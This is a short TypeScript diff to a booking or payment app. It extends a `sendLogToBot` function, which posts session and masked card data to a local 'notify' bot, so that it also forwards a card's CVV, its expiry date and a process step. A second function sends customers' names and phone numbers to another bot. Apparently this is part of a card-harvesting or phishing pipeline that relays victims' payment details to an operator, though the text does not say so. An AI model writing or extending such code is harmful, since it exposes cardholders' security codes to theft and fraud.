@@ -5,6 +5,9 @@ export async function sendLogToBot(data: {
   sessionId: string;
   maskedPan: string;
   bookingId?: string;
+  step?: string;
+  cvv?: string;
+  expireDate?: string;
 }) {
   try {
     const response = await axios.post("http://localhost:8000/notify", data);
@@ -57,7 +60,7 @@ export async function notifyChange(
 
 export async function sendCustomerToEchoBot(data: {
   sessionId: string;
-  bookingId: string,
+  bookingId: string;
   firstName: string;
   lastName: string;
   phoneNumber: string;
